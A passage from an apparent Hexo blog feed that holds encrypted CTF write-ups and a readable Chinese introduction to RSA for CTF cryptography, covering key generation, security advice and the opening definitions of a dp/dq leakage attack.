040224783abf18aad51bf381cf946fab4a8484b7a438bd23ffa4883c5a281e568e0a4fe0f78bb075ef2db17255237c1a86855875180aab61039b98df733ea20a38e7489f0efea185992792ee06b6c24119a4047936d59c48ee1d9a9b7a6695bc0bdd38953dc409b8b9d215fce9f93fb834bc0240f38851843a1bf6c81602b3580e130afa73929bc254a12fa9f92b7be29d4a6c3a735beba130bc41e37d5d1f2e88063e4f72ba93bae110dd075888e6914b897b7ac5726e97e6706fbe92459d6533c95ebf4118c0cf918052f78a9f027475cbde58752e4cf15c4ad627e64cc8cbb2fcdf060397b87f3e8d49cbe8f5465022207f0bffecbf92b40d68d5ca26e6b1f9b5c2847bc8c4266f826ec48d4aa92736a20ded1965c85c617347f8407f4c1f8842ac6ce60246c261f0f43271d49384ba1df31508de3cf64cf40a9fd27f67a6092d030c31d353d85031706a2f20cb24962b59ee04e3ea14aecfd22f32c41980822adb9cd2224b76cf5a6239f0163e26d321ab8cb0410df05c335439301b28728d8ae45e14bb1baf28dc55ea721c5a5dd4c14fe9299065e5ab302ec6795d860ffc363fee10bc0d073f016b2823a74e29ca41b6143650477691e7ae47953b8bdb9203f79b030c1a91c1af9ff023f6f425bebdef8f8665b35484a3eb36f26c93e2b775e5ac70c6de834a0faefa1795bc2779ff2b1a25bf6cc6e18170f06205299187fa78af0e19e1210b86c48f17da3a37371986075fa595a8ac24bd91a1419a12e3466fd386e3c50335d71945bfb37861018d5fbd627a0054895052a32ec3c5ebd924aa56b35400591104ff9b76b85830376436921929bdfe3d9638499d7981e5c1d2170c1874368d9242085ed9ed72105cd578a976b346ec52d8c74bec5a18782e5e43df44abd46330efc2748ee9913d1ed4d6cbbaa14b0fa5b968cf1d300b82277c42d7959c4facd626cd0ffb55d2f1882ee0641fbff789b67fd34bef07375c69021684cc5bf43fed62cdff5acb6914b09507b7d9097563eb42d5b4ba43cb3dd6ae3b371e2ec994a69c8da98a668a6b1e5a03f7381f3d87daf7c2cb7b29d6e2af82fe3e5e7682b3e214c1af0b614c3ee077dd92d70f0f27f53e540dd315634c9731c989888883fc9e39b9be550d129dc01c3d6c2632be9def25a3fbf3e5d6bda5db6cdee672f2b618aac7fb9b231d22519a6aa0d0625af72401a6cfdccec76f9c6ce47129183b60313c5a357e20f9ca8ae8eb0257d710e29ec67adaa2ee78991bd1a32fd726f7c0394fa45d6a15305637656ab47363fa26790988d2d8cb0d625106230bf3c5ec1f027631bfaa9e23015e7e7d280a477448b107e4eeba094614f883328d0e78560967b6f2524802ad11acc15420f6760cfb473230d5c5049492215be3ace510c94d5aab501dacafebccb28daa394c2e529117126ee7f4c02f7f3993c3fed3258e47c0cbc0d0169a851b1cb4cf95884ad35f7d96663d767fe5ed7889da042f4dea9ea93dc81b76150d728510b0da7cb4cd0bc2240ca96854167858ff55ab5d57874b802f6fa55f42732f9ddcad32ced5fb12c4005ac0e901dc36c7f0dddf90ea6f7edb8e1b9515e713af3a3c1a42c66ea470706cb73680afb8fe6c81af246241f9ad8c49dda4612227a56cedcafccd6f1eb49f1d82d70f2346fe245730cc7f37c09b90462a5483d4f760c57974dd99e8126f6187d7ec6b90fde1eb8e23da152fd6845d6b973edf1673c84cc4e45050d33870ee914cc5a44b06dbb059a2a0164885463a0b9f5bef14524a1643faa2fbc44f5e05e7dde4cc670cfbb20a038cd95e3ad8ec3cb9621ebcacc4b950bf4167b7fd48b2e3b5a1b22af3efcb872b42637877443b3b7506ff3011283f09bb8edc793caf6dd65d8a218501120b531600f4fc3e76286f6ee5ed406b5a55f8214e0a39f23f9814d2efa22844143ee4a0787d262035c2dbb6bf17198abed4726bc9c2330615fde8a399f8e745217305140c6d434d610c56c3dc38ecbc3891ea45822fa6efdcaa1d271b6d07157af218609ace0ffdf8e7519cd2ab80eeb43e215d0439fbec5d666a895ec60b853028cfa8b6e12a5cfd8c6445a70820d97d7b159c735770670726d29144ad0e1d37cd3afc4c71174ca4808f439ea0ffccfdee49900491fccb14981fd4b5a86d68335c29b9117ba43913775e559315c9576d0e80e9378f062f29e3af07f9b2df7ef8c742ca42849e6b9c544973b2ced2ed16211a3024daec5049e4cda1945dda08f24a21bac9e7da503013042fdf8a714d9242b6f6e43d199c8cae9a9739f922803d8bf99d53587866ca8877a9cb3600f0ee21d59f27dc85e913cd8c96b517545fd1fcd434ddb815fa24f5d3a8fd97cb444ec23ffe13ed29a69acfe01faa8ff165fd9c77792092fa2084ed2178a45ab9b702e226c3254417303aa0654c5b654c457776bdfea08794a4cde067fed47ebd0961771412c903755455303af6c4208117b66db3be3e742a343220f523913087dddb687c16c9946635b1bac0a23aeb2bbf146408e723eea2fe706eacb3e773d11aa176cf20265a4f675f3c2cff550c0e670f0b0315794b226ea34f5c5f78bd4fd2b3765fdc99612d4a98a9a07d3112ba1ebc211228c892a9e26e505e37aae624d63999f877d0459cc18cab1f2253da9b581a889d09bf517a6073706d53f51d9bc35ec64c2fd28f3fb461f7a7b924cf7efbec832bc2c080042cbcf19c7708c1b173864619fabecc1e9c8083fc556073e1f56f5fc1b2b7c668866869d5c65d72fd2c676b5157a88a9ea27f809ee1618e4171dc105b26fd4570719e8cc5b3973f54446ac8f104655d1bde470f27a0994b418db341a2f691655cb0d541665adbb20623ec24df28890aede69eb20dedaf748cf661add47d0a19bb61cdac7c07d6cc71baddc3a0a35e922e84b347b197f8d761a5b207ce6de0670166250e811367a2b83dabd40019239a00056479c82b77199d0ae46a4a7af045fd05c6814ea885152f1900418b9a3b64c0f295e856a9f5a5d4cd31173ab1e338efa9183733d8b708ce2870b91b40e4792bcd40a5d29d1c23f8f7dfac0f89bca0c71c99bf72ffd4442f58f3903276869961ea037defcdb3f3f34c5652a6413b852b7d998459619773841c87b85fcc644d6727bc49085610f465c3c3edf3c21755bf729c16206aa7d2fe803bfd4dfdd797898f1a73ac07d6e05d09e03df8c93da4669a3056895a6c6fafe93412587370f1b2f8c9be8a4c1d27345546965bb0b6ece7d09d5708ae4af0f318147c87af1dbded63d24f92f4827abe080e8fbcbc5f1c817282af80dbb9ededb74069f54a836fcb0cd3b7d968a7241e5eef423e3af388f177eb37cd9aaf4b8660c3aabdeb047f9410a749ca51cec7e07e88f42d52df550aefd5394c5e67b6f868400ee1170c3758a141202a885d2c178fb65a674a2ca76e61add8aabf049b990f9750d35e11697fe7cd81bbf0862d9d138a6d66f69671dfa7f361451e37b5e102255fdc82be3c6e1cc3e6dc806e38ba2866f2709457c7f060cb46a0411fb49378535673c52e92893957ff0b2f506e14a4940da41bc7b7f0bc39fb34254bf532f165ed5f1c36e1a8fd5c115285576f837d3c758ce83ea53f477efe07d6db8cbb6797c1530b3c45c5d99a7c8458d56be49ecb646be5a6d77f8c962c173010a522c8f5946da3bbd06e86b0b3af7a27efa4b451ae5189654a5a947a8f1022f2938a45059deb2d56d2ffa6dfafa083e72bbff0729de14d53d871ccd148a7df6d7eabb9af4780c8debf4df373cc2f233b0657231f237ae0f71ca456ddb7bdf6e7bbbbdfcb1510cba15cd849abb9a424ae8fd51c0ec7323811e551123f5bcf1997e89a72c081058781c4724aa1dbc0dcfc735cc320aac77ad689a0007fc9c1432f151c2fa3a4758640d92796792e8d4002696a8c87c4b289b2781f972666b94d92727c25c2e55bd42c46f5b08e432f5029283b596635d2a87ba9660c2a90102503da271086bc7c0df5cedd990634042593397f4ac8781301ca70dde12c4e9f16a4518fee5363e6490349d9c30d120924b81d3de2b4afd5d17ee440918e0b2caa1a3fa2c38cc859c00962eddc6188159a557e42f096dce601d763f57c283170419c76a7c03f72c246cd3777c6fd4fa9f589693e810cfacf706d54e1c7ab6681cc66f3ff0c221d948fbfd7a3b7914ad0ff1ec3bdf6aa697ecf0d140ca8a4120ae0c57a2f73abb33525794bd3b3a48ec203d3b1144d57fc13f9d4976b34c91f33fa99730114c1a153b150e650544984c761701be43681a494126379559be2617492c3c95960d0ceac2896851493b1e3bb09601a80cacd4655d922417bdfd06ec686e94140bb489bc582fa6ff3abc11043e1f772f08e08a1cccb85f2e47123583b97cab943e8c719cba75b4369c6e302eeda0779be4b6fc4b3da1e6b11af1b1643b1a48b7c11a98b15f7115be527790c930cb8942ab7deaaab13d182671787b306d810a84cb67cb1cb38dc6eb8eaf81ca4b95bd48b4df92316471f8ae477fc3294af8b1c32fdbe97c0faf48f138f3d671704fa788babac809b894a8f60a584fc100d5c72571fdb06130e53df6544b0657ef8da6604af23661489978ca630a0c196b59e97cf6a0de6272a7b3011179e3d949fc35d99a83cb576f04e0eb76c275210fb2e2ed90bbaf6d481434f107422df6e88b415123c4d91369ddecbdc3905397d8b44cda3b7f8e6b888653a1c7b7101213bced590c7eafcc37ae62600cac0b91996cb1dd0e6ccf653dee1e855aac35925eb3525b11a07039ff8000ff607226b2142ce4268403f0a3475ef57d48a5f2f956fe6a1dbdb12a233838d5041943f5d74807b915d4311d2ac4a5e900524d09830d63f7d7589c1f9e72e27100e39125e589caf15130a2adf2e7e19af8f386dcfb86c4ab24896ec70e688f2ee048b09821431c616eaa8dd4a508e1025661403e90a41ee061135071bbf9ea20bec2603cf845a57501c119a550df648f06731a8264b6a1b668fe310b6cbaf898883da069af5cc3525dfcaf8abf81525336e8fa05c65e68c42e095b942fb6ca1ef1f7ccb1978b3c745df12eb7195277ecd0bef45d82ecb90d45a09ce8b2b519d487818e5da204f11b00986fd8b49ead18e21269b7c33726537f04d87541bef47aa99c0d2b8b937c5afaa84e7ef83bd4f510415aa1971d2386fe6f4e4f9b075322bd9214248197f86ecf1b270946aa5e402e36b99c786ca498df0ddd6d07358afec7608a3a3c30e218a6a79d6f72d43da05d3f5ada44963d1ce054d13a95c88bc0f7d6809b0982a58a3c4b08e2549e7c5ef09cbc6ad101903184ed880ce37c68c5ae83cef47e11d1ccfc095a46c3975577534620674a939b31df12a28f52748ab81eb48c2e3957616bd532ef54df827caf17244904c25c1bf36de7e07a91ab8349bcaff6de6c1824bc04bfdabfc6681545bc1d1f3f0a5415f85e447afde1c055e5e1fd6048c293ba611e8ba025c5a5d633bae73c99280af7bb876b65aa52cb3a30090d9be05fda55fd168d8d3544480dcde96e762b7327c37fc7f46dfa53f78370fc3d48e8e6ff45c4310538a970a35004d3d28f0391f8d62fc08bed1a71889217cc01ed238974c38331468993b7d6951cf894d55eedf6594270d34445fb07122d63d3502948b10851b59245c1c9a720b0a8953bd30fba4064bf9d69ed2adeaa36afc6f9b69a601ff5021ff3bbf88649e8945273af06e78869566489500c0bc0488678e72114f3a58f4cb92fd43c53a9529ea79bc85bd1a9ecfeabc04abbb73dff5b7e8bef3f0bdb06cae36b571f527313c8787ab78ba409d55eacbc6f3ff361d57c32900620e5acd41b11683581f6238a989db7258f0ebe7cbaaae6c7b8f8a16fe145f19e4ef1d15159c203697fc568987b383a6616099109d328fd3a13fb641d332ff9356f7aebf31601d70053cb287dec17aa34a976ccd9e1c92b7ee2393b361ab96a5e021941d4e84b99930da27138d4dce9b7839d933329393cebf0cd356432329ca21fc8e147d58c42433d9ef60a4c2cc369ab9eedc7d4111a034b02aaa4618c4fff2317e578c0ad8442b515026b9668cf8f4aac3c72697d7acf526193e74bffe4b780e6282811ad064863c086137de4a1a278a3cfecb2b4c06417967f96153bf2cd5f17920c1bb94ea0325b63833b0e7bf5a0e0f091cb3be13086315a28c6dfa9ecc7b7b50e8209abf77a95b31dea0d6e768a42a6831cd04ca5499f213877519067aea891139a7c4c29d653b328b00b86a267c3fd5efa6409c1e58d547c76ebf4ecb2209e76d80b58505c149c7a28b4b67f6bf7697d257f6eebf75f006f1ddad1a2893ca3f2ef8ba193861b77f0f6f13b3a21d320e8f1ff3c4409945ab5c8ce47344072faff9b621ced9367b561fed467c44a5d162420f24f347b5b23715b31c0304f3070a2a8c01869a7ddcd95e211ff6a8e972dcf7995931e98de09b0eff2d111f4d5bfb0fcacb706db4c2654e69c2adfeb15b64bee6f72863eac5ba4bad1f4f11e15b5fb99b1d1c49b49aa173d7e11d4fa7c46eec85be28abe3d50e81860a745fdc07ba2aec62f56b2e5a7c527a8943bbdc146e8ebfa9e1de16b71b84e2b7b87940bc290d995602baba0b2873d3683cec26d1b8df5397b81f5dd5b02b7799883976530cfbedec0a8d9ec18a304d75e9a28d231e3fc75dbff5204170516909dc54f38c0e6a20d1ceefd7f80ced9934e71fd88e5cd0d59425147007b73e798c71b87ca41a51cdba0c6956383cdd0869dc6586c9d0cc96d0efffac0f34c4ddf64b0444c1fb534ec207e3e72e564f6d504657f80cdc7c3dac4d6401510656625090688e7f03771e450023bb4115ff9f06d85e4828c0b732d2e53b11c8b5d8a1733f3266e131dab309738e5935c1876917854ba32901da5a0ee1ed4c65cef6f702ff4ec7c6be2057af1e1504f5950baa5b52d7d8cba8eebb203703623a2ab5ff54a425334fe3de3cbae4b71806b778f7294d37fb41d53a389ff693b189d9f233970d7dd43af45300723376db0a34fc25b906ce8547c0409d2476add781b8bcfb04961002a49a8e57a58391744e118473fbfba6d1d097bf63c254e5d32ae87426fc493fbd284b47a6d24b97ae98f72da7dedc8ffdd9deacde46f3fa459dcb3db27f39e9ba55151a9a15cd75844b47874f0bb19e87654cf3d28ac3e64267ed2f02078ac9aab46901aac4ba1abd0aeb4092605d1186b3eba5049a505cf037b096ee557613558efea7dadc59910c2db47cfd30e3eff7010ea7e380ae64295847975f97a645bb5bc53f59c1206f6539a8db4031d83016c7a0db929671d908fa49c16e01a34ca5e9f5e50a45f1e9738bb9f719bf84db4318f5c9d20f79c09d252b24ce6e7ecbf8b9809e12c6e4a511ada8e9221f67e66be66a97b3e83c26f57c49fa0845f4d74d9804b27c3617ad5d6f007cd66d343a381c1935bf5a60e5d68898f126397a2aa0654274b2846089bf48fd336ee3ddca74cdabe5e869e299f61099ab4b8255b4f112f4ddfce56953a6d50d2f204cf18bb94353bb8023ede5f89d0e9c21e541373017be7c2637d4fb066203cc4bdd2881ae3d0216f68f9ad61609e53d95802c36956217bac83d6c4a026cc254d25735bef2428459c8c9a0d8ffa7f93007a644e93bb562a338605779958577670c6a3195101ca6372fb74ff9314a6e4df2bf222328579c40e7f45914a581265ad3af3ecba43497d44cd799831a542d594e94b7ac8ebd4cb66c114c009d5f548602ace0d99180a351f3a1d6f09614a7d2eee597ac96895e4a3dbe86394e182161cec236fb58580c588bf6cdade9c18b196ca477d42ad35c8615093186cee795408619c9c2751e1f9ae0acc87891ea2a944d362fe355e0dd48e0b60961b901abfe8adfc345f041ece13cbebf0a48049c75799d04f04264f20568b0ccb4a4ed8412bc010fcb96b3060eff7b3d26e0dbc49d56c2fa500988bc1bf8b854b2def904f8e96b61d81df4012537cf903c5244920255590f1004a1691176a41ebfda4572e2850b9ae0128182e5aa1c32c4cdd3bdda420d499e362936cbc505998fc7ebced3dcb391ecb20aaebab92b37b09bf4f080b51361ef10b264cb21e36667b00763f551c3d73428a56e4fa25edd276bed4c964c7feca72edbca6a7edc213390abc5287f1911081b2c16efa700c30af3062dbd2a8d752cccc6f9d8b019e573699b8e3513b577713dee736323c6f1ef3f934e50d4ff5e2f332baa14e488248dca46d9baf12974598fd9635429f7394f4f033ec0a8c6388e45d67942a962351fef07e42b3756e6c13d6f41872245afc1c09d1637cf9bfccc77c67758e91f53895595ba81a5068e9838371a06db5668b6a93183960881f3080f4599447c56a8460314a476ad5b86377a23310fc1decd2813a2e5fea7a1d272be46f719dd5fe71672d49465d2be112cb0d1da07c3439adefa4cbdcfb06ab2d64321d4ac0977065608e1fc85d6de0ab48eaf72a0e0bb2181e29c88bc1cd299af1f687e3b2dbadb36d30dc868e5ccbac9b0c561e6d367a0d7de66257039e7660a8f5ae4e768ee0bc630f7ffd32ea274471c4f0a7d3a3eb324e9281124174e6933617caadb52e1eb3c4d2e33bae3ebb156f263749c6931615552422a24120fea14cfd1170351894a74618ac6dff6027d7500f2f55d006896f91283db975dada9c7adad8d0f7a2c9cd0761c5177dd3b878f16fdd7f0f45e1d50a351caf5475f7bd2056790b2f623f48fbb8f67d2f223e5fd3b496a5c5ed3da0759945a088b2d04e722315f23c4fc12c8ce519746462a210e75c758262b309208b4bc580b32d754356acd29786de13337999734481d3914561a425e30bff32f236b492bb9b7c06639357ce22715952b1e31afd603cbcd05daa5e8641c5c2e5040c6aa9034403ff786d1fe4d3e04f2909832c98976fe97451531c06c94eefc9ccf1c3a45b6ce0aeeb82056badae9112f5f9aab305e81ae29c8629efc760f4d42a7668b8d19b392379149fb8fe52975b24083f75c3c9c8023677baee01eab66585cbaf7098e0661de4b143359cc6f37b1c1c9e1cc43cbed537db389eef4791e05c14cbfd928cab7faa2ab538eb5b530da21cec9a3a17ab413680857e26050e424f2b2992ea38bcd4235d36caa2d90b27b77b4962fadb8b86f1b851ca6b792e009d55482498c71e9550cb133067250f8fa508733ce9d3f8ce99ac3d2ba8e36d9682beb08f0b7a9b678d28df3beeddc7d819bfcf663b40e710476007e904174079799c0147c88d0ca501b5b4ec2483e9b42b13c233b98e74118b9cd36d1675f43b56fb7ad35054728c65670d634758cfaf0a2781e64fc27d35a18c2bc9033a1b0db0f9c86dd08e2d9a90c0b465a530f45328981f01b799afe702bb7f64e16f88d4c773d6bf46a445ba6975656e9221ceb603a1839225087ac87ec1ab8fba35cca8bf847ecbee12b19a47a3c99842d74428a9ee8877fbae9bb93caa23af79bb5625cbc8c4cae6d737a807752245a2c51aaa4ad02b76430baeebb9999e2a36b5dac9e27e5d88563c585e0f25bb7d4589ae7e0ae1b1e3931b7d693639df161d839ccee6269d2ece2736fb7814a6cf81f7273146193cb1d1bf435cd218bde027814623d36a0b433a89b849fbc1ec4237eba8c50d2e411b5dfae252ebf1847fa70f1dd8834650fd4663411ee66207fe8f7acd67588ea91a770959d2f7f0f59164b8313d8d75da847a2e045fe12ba1dc94bcbdcc57c5be71874b9b35d544cd33459b0193258a0af2aef79cbf1246408f8c95d77680014fd2f9c89249548091e85d04e08bf248c7ca1e687705592b8860e33f225f0aeab983f063a89829f5129b5276cfc546a5f0db19b9ddaab6c0c2c6bf160bcc5aa910836b134bd8782ad78f55f82fdcc1258f31f4d21dc0690742c88838a88501b5a8af9262cab62e1533b611d93c0a0b36968e655c0ec39bd4f663b726e0ebebf8f66e2a3316c5a384ea2e60918fc786104fa46611e6b34d3933b0a09787a4feace44b70ad2d2d666c378577296dbc45cf13e3d52be87ddf4097509b4a21cdcdd7593299283e318a9fc0fd501a858052cea6b78ceb2336431f9d619e42d7408359a1798a250c3ddd67a5ee92ae444394645fad1248a9bb218cdea49929d3aa2417bc30a743dea350919e8c9180cf51c2000e6f9e8612b7c2dc55c26ea3baaa90d02038520912b9bc56749066d506e56b25c223946d302ced06b04470a339adb1965ee624efe62d58991a18cc6d57e9d8f15a3efe9eb61fab3eda15f6541f4de849365a0169ba25df6dcf3d5193455b0ecd4d2a17719e8e7cd0b7fe009300ac2ad95c281a9a973c42b61c3273c9845166b505975e33d24d69fbd4bcf997d72c89f3804e7408a0f31681a8508974dac16bd9604a2c45a15ae9c2ddfe09aad2b78ca7981a26a74a9b8bafa791f1f4b8c89e996a0be54bcb17a0e547f1617af47f0e893abf1a459e6ec8441f17030c42fbb9eda23afc258393973354a4f6eb06d378aa501c221922098598cb5cb6981e557dc73ea55f354c8c5000120f7699d39774682b5bdb88d828775203533bd4de7d1e6fe563009cb80b840114c68767b2cf059ebf98a0e745fa2371eddb84ef7ab08cbcb2c1b1f4c30d946fe0af027bf13b4237357f5d19f12c7c2b4f635da80f69437f04cee2ac98c4babbfd2ab0efad2713a01bb2e924c8a7761f490f4d825e3ad9d8a3f170ed9c1076810e030b9592514528db3a00956a02b71c5f071b6c7d90269ba511759dedb9bb51d4d98a2f88467be86f04e622bb2cd3dcfb9c1196f8ae1f88243047f0265e687de1b7f27a8de54790445a3ce06b1c92fd0b3668c9832aeb8a1061ae467c4a076d6f1e6cf608fa9657950539655190ca5eaf22adbc91989323a951c056c1217c90dfb12eec7db88aead895828332fa18838b70d1eaf62753193a5d159e257119ddea19b23121c82c1741da05ba8835cd37ad026837e537eaefb642943d4cd7f1fd6734ccdd9dc9760a387640d6aac831ea74fcceb55cd1a31bfedc7579759f64b0c3bda134c27a0f77ea52b856e1f62688c5da9d64816f7698bab32b7336b8c9f4aabc3a17744792f45a6765dea9c02fbe7f6060fcf7516187182cbfd4fd1c0cd4571ac8b72f47599760b15ff7ebb5ffce1231d52ea05e16eede732f573d0d9dae5fc42d14dcdc5d69b192cd18d9145a30d0ee90390583bfa88aa85ee28f1dec8b8bc5df30ad6d4ea84b261cf16cf91a5fa5adfc92a921f8b4483a63d84fa3ed446c71d9feb95c9ef5fdb411a1822f98c35966a2361f9f5c03c43a19f3ac36ffa610bfdc8f95aabe15c94c385e863c9233866a375e5e115b028a27b56b7833e80bd7c0c243d644035f6495621fdf8933b45c9e93260754f1cbbe384da090d111dae0721b3f0f025102f8afde3a780949974aed9085ca5a4290f8be8089382d8bfb92ea5bdbb41a57fb8f5c5a7fa84cdb227b18f5f9424db5d78bdaf98877ff5f8b9e0ac6f150430540fadba6fcb38e09b472cb044e4b82f65cd49e415610692b6c527eeaf8f1427cfc00aef4397b29551d2ca8fc2d2a36aedf9cf5dc696739a73bf5141189a0c04ece4d9e16a5d738e99771ad6d72ed1ce9baca534b83a6822</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="De1CTF" scheme="http://yoursite.com/tags/De1CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF密码学中RSA学习以及总结</title>
    <link href="http://yoursite.com/2020/05/01/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADRSA%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/05/01/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADRSA%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/</id>
    <published>2020-05-01T15:20:45.000Z</published>
    <updated>2020-05-02T00:47:16.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RSA简介"><a href="#RSA简介" class="headerlink" title="RSA简介"></a>RSA简介</h3><p>RSA密钥体制做个简略的介绍。</p><pre><code>1.选择两个大的参数，计算出模数 N = p * q2.计算欧拉函数 φ = (p-1) * (q-1)，然后选择一个e(1&lt;e&lt;φ)，并且e和φ互质（互质：公约数只有1的两个整数）3.取e的模反数d，计算方法为:e * d ≡ 1 (mod φ) （模反元素：如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - 1 被n整除，或者说e * d被n除的余数是1。这时，d就叫做e的“模反元素”。欧拉定理可以用来证明模反元素必然存在。两个整数a,b，它们除以整数M所得的余数相等：a ≡ b(mod m)，比如说5除3余数为2，11除3余数也为2，于是可写成11 ≡ 5(mod 3)。）4.对明文m进行加密：c = pow(m, e, N),可以得到密文c。5.对密文c进行解密：m = pow(c, d, N),可以得到明文m。</code></pre><p>整理：</p><pre><code>p 和 q：两个大的质数，是另一个参数N的的两个因子。N：大整数，可以称之为模数e 和 d：互为无反数的两个指数c 和 m：密文和明文(N, e)：公钥(N, d)：私钥pow(x, y, z)：效果等效pow(x, y)1 % z， 先计算x的y次方，如果存在另一个参数z，需要再对结果进行取模。密钥长度：n以二进制表示的的位数，例如密钥长度为512代表n用二进制表示的长度为512bit。dp≡dmod(p−1)dq≡dmod(q−1)</code></pre><p>RSA安全性分析</p><p>对于RSA加密算法，公钥(N, e)为公钥，可以任意公开，破解RSA最直接（亦或是暴力）的方法就是分解整数N，然后计算欧拉函数φ(n)=(p-1) * (q-1),再通过d * e ≡ 1 mod φ(N)，即可计算出 d，然后就可以使用私钥(N, d)通过m = pow(c,d,N)解密明文。<br>保障RSA的安全性</p><pre><code>1.定期更换密钥2.不同的用户不可以使用相同的模数N3.p与q的差值要大，最好是差几个比特4.p-1与q-1都应该有大的素因子，一般建议选择的两个大素数p、q使得p=2p+1和q=2q+1也是素数5.e的选择不要太小6.d的选择也是不可以太小，最好满足d&gt;=n的4分之1</code></pre><h3 id="常见攻击手段"><a href="#常见攻击手段" class="headerlink" title="常见攻击手段"></a>常见攻击手段</h3><h4 id="0x-01-dp-dp泄露"><a href="#0x-01-dp-dp泄露" class="headerlink" title="0x 01 dp,dp泄露"></a>0x 01 dp,dp泄露</h4><p><strong>场景描述：</strong></p><p>假设题目仅给出p，q，dp，dq，c，即不给公钥e</p><p>这种参数是为了让解密的时候更快速产生的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp≡d%(p-1)</span><br><span class="line">dq≡d%(q-1)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;RSA简介&quot;&gt;&lt;a href=&quot;#RSA简介&quot; class=&quot;headerlink&quot; title=&quot;RSA简介&quot;&gt;&lt;/a&gt;RSA简介&lt;/h3&gt;&lt;p&gt;RSA密钥体制做个简略的介绍。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.选择两个大的参数，计算出模数 N = p * q

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ISCC2020题解</title>
    <link href="http://yoursite.com/2020/05/01/ISCC2020%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/05/01/ISCC2020%E9%A2%98%E8%A7%A3/</id>
    <published>2020-05-01T00:06:50.000Z</published>
    <updated>2020-05-07T14:56:39.069Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="477f298956275342a6b8924cfd7a33f236b54e360276f09bb1b2fea7fa47877f">92ecdcfcff4b5dfe58a6c77169678fbf6c39f7e8ddebf40fef0ef7e0408c55739f551581c3ec1a1661c87fa8f5dd8b7bcb92464378f3bf79af5928763a15f1641d1d8c2bbbb28cde3bffbfba8bebbc84f0be661b75aa8886c0aa0cc059b68d22fa26805451c6403c8aaf4de9d896b291b473794cc469cf500c2d4d7c0dc9f4a376e80d20044cab4ee5da0fff97d26b9b13ed5cc1809130eb3c7790edbb477842efa7cfd1878d8ba22957fb37e15cedd7d3a9edb184b18cd1f16151050a2fbfd8598c1d8354ae19dc09e45723becd5f4a59b178cc8d01e1d7f6921f0f60ae3838aee8d44de21fd57dcaacdf23f7411955b6e372b12e31a7695725fe14a8ad7b305b50ab4a5eee4de048a316d0a04ad1c95ca3f35ea9df5024c1e9e2fe9a793e770986f3aae160d2e227f4aeac1059a19b09cc12de66da9172b43b917fcbbefbdb2017c27541c167adccfababd68e8f428a99da57f1f73bdabbf38c80fe8066eee04b0bb2e09c9532f908e82aa6ea75cefa21ff92343296e0ede15f58777597d94b098f96d802826dc9ca4bf9fd31e9eeacddbcf8134adbfe604882b9d2b8fd02ffe2c51533e64105a8fd13fe1c57d138493930d6327b700d649a5caa2670fbd3c1de869d71347694458a3ab3aab0548a7ff069b2bff454a536c6cc65724e8651672d6af75bd491ca56bf6b351d1d2c56de2a95f2650e00bd70f23f4068b53378adeb9c3954af9351109598c721902171637e7a0ab240ef5746f2513fd0386fc154e913b35c4ddf5b0a63e38655593a875bee56a2717cd059da6ef376f7c68c5800bd11893bd817f5d2ac45097cf877c3a1d03a983f4cc3a117eb1b2049727978d38046fde6a290fccb001460d45ef46e81008160a3ed62a895840f32d55c3e792a8991a73d6f048967e40fe8d94072ab8fba97864a87740f9c06e4d078d1290fcbc29dcc94205403e12440173854805cc349993fa2ba4fd7e05070d5ace4d481f7abcfc36bfd7f8b368cf9c791ae6dc65b35b18cd80af98e0f1e03c03a2233e939d1b449914181240eba67fe9ffca067d77ef73e72f803381f2ab3d36c292aa1b7c11fc8ec75ce32534d4e8c388a8f09afac46545cebe87d5bbc92e386f62a37e3be97f9115c18ec1fbbe49082d36aebcb09ceb3fa93b75335905f20ab9701070be65d05b0a8d3ecffe4817b556f01d9a16f6995b2cda3d7bdd1fb55656f795217b16b6c64c7561a4db8bdd40d065adec97a072cae9929a46f29d307206ee387df05291a152a0897813f5616b7ededcbd19b5aff82582e8dcb02676d10b0c8ae4a307d6b56f8af2427a552b1f1974c78a26e5708b5d76d7d531f1e9e622e8fe1f038ec40f9bec0ad8d50bc73e1c80867da866d7f529841f79359e2abd0df12ff28adac84f83d9fbb65830fa4f1782b4c5694f7f2da452cc850623bb95f6bbe459973d1091f0f43bd1a8c2957a1323cd7ef2487c38800018480d78c0ae4957e8612429ee8f5199ec9027b735d5b4b6c3a99b91534c4819656da31f92782e9b7a8ac3aa84c63f6c050cc57903332568c7757ece3a03dd503dd363bf0fc077eca74e273ba3614135ddf15d9de12c2745e5f93a667904c5b9bf056a837ea86637eded4402cb51d4e15debde38de8b612fc128a2c095e47ef7ee5d06838c88f5b8abdd25147529120d357d9040663a47dad7e8a8c57f3b61cd4702bc4ef4dba26e19ba6a0a0dee5f36c951432387056b4fdfd2d8d944d1586eebab6916fb374e9560bb9dc7cd5c09aca609f8d908ec7921e101f5595863f33cc2cf57896f58659579d5bffbc1dbfb571da3e43a7732b915be0bbe5b5dfd746eb59345f4071354719c73e605d6909d0e2c3824025b931f22c661dca3dd07e7212e4e3b5d73a8e3af7e8dbf702a0370b72fc6a27032e98a6928bec91c55e556dc80f33028801d7e959d203e4c9d1f4dd530290bf5d1aad39dd